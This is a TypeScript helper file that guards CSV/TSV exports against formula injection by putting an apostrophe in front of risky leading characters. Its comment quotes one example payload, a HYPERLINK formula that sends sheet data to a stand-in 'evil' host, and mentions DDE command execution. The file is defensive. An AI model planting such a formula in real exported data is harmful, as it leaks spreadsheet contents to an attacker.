// Shared CSV/TSV field-safety helpers for the RFC-4180 exporters
// (csv.ts, tsv.ts, metadata-csv.ts).
//
// neutralizeFormulaLeader guards against CSV/formula injection: a cell value
// that starts with =, +, -, @, tab, or CR is interpreted as a live formula
// by Excel/Sheets/LibreOffice on open (e.g. a translated string of
// `=HYPERLINK("http://evil/?"&A1,"x")` can exfiltrate the sheet, or trigger
// DDE/command execution in older Excel). Cell content in this app is
// attacker-reachable — imported source text and translator-typed target
// text both flow into these exporters unmodified — so every field is
// neutralized before RFC-4180 quoting, not just ones we "expect" to be
// risky. Prefixing with a bare apostrophe is the standard mitigation
// (OWASP CSV Injection cheat sheet): spreadsheet apps treat a leading `'`
// as "force text" and hide it from the rendered cell.
const FORMULA_LEADER_CHARS = new Set(["=", "+", "-", "@", "\t", "\r"])

export function neutralizeFormulaLeader(value: string): string {
  if (value.length > 0 && FORMULA_LEADER_CHARS.has(value[0])) {
    return `'${value}`
  }
  return value
}
